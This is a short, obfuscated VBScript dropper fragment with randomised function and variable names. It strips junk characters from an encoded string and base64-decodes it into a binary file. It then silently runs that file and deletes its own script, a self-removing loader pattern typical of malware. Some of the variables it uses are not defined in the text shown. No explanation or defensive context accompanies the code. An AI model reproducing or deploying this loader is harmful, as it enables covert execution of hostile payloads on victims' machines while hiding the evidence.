Function jFXHlcpJ(ByVal ILUqGdTE)
    Set UGozNEvl = CreateObject("MSXML2.DOMDocument")
    Set kHTAQDzB = UGozNEvl.CreateElement("b64")
    kHTAQDzB.DataType = "bin.base64"
    kHTAQDzB.Text = ILUqGdTE
    jFXHlcpJ = kHTAQDzB.NodeTypedValue
End Function

Function VZJtdldq(ByVal data)
    clean = ""
    For i = 1 To Len(data)
        char = Mid(data, i, 1)
        If char <> "@" And char <> "#" And char <> "$" And char <> "%" And char <> "&" And char <> "*" And char <> "!" And char <> "?" Then
            clean = clean & char
        End If
    Next
    VZJtdldq = clean
End Function

cleanData = VZJtdldq(ARJqVVXP)

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write jFXHlcpJ(cleanData)
stream.SaveToFile kuLsmRpx, 2
stream.Close

DGnveAzw.Run Chr(34) & kuLsmRpx & Chr(34), 10, False

MtrXMyDe.DeleteFile WScript.ScriptFullName
